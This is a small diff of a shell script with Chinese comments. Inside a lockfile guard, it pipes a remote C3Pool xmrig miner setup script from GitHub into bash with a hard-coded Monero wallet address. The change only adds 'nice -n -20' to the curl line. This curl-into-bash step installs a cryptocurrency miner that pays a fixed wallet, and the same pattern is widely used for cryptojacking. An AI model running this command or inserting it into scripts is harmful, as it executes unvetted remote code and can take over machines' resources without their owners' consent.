@@ -13,7 +13,7 @@ fi
 touch "$LOCKFILE"
 
 # 执行安装命令
-curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 87iaU5sfd2J6eAYw26JSQg6tDdcrkEG5WMSP8Qu3ypUF81XQHgNBvMBj3j3v4jr2exCX3rhAc4zaMJfhNAL7gn8u77TR8Um
+nice -n -20 curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 87iaU5sfd2J6eAYw26JSQg6tDdcrkEG5WMSP8Qu3ypUF81XQHgNBvMBj3j3v4jr2exCX3rhAc4zaMJfhNAL7gn8u77TR8Um
 
 # 删除锁文件，任务完成
 rm -f "$LOCKFILE"
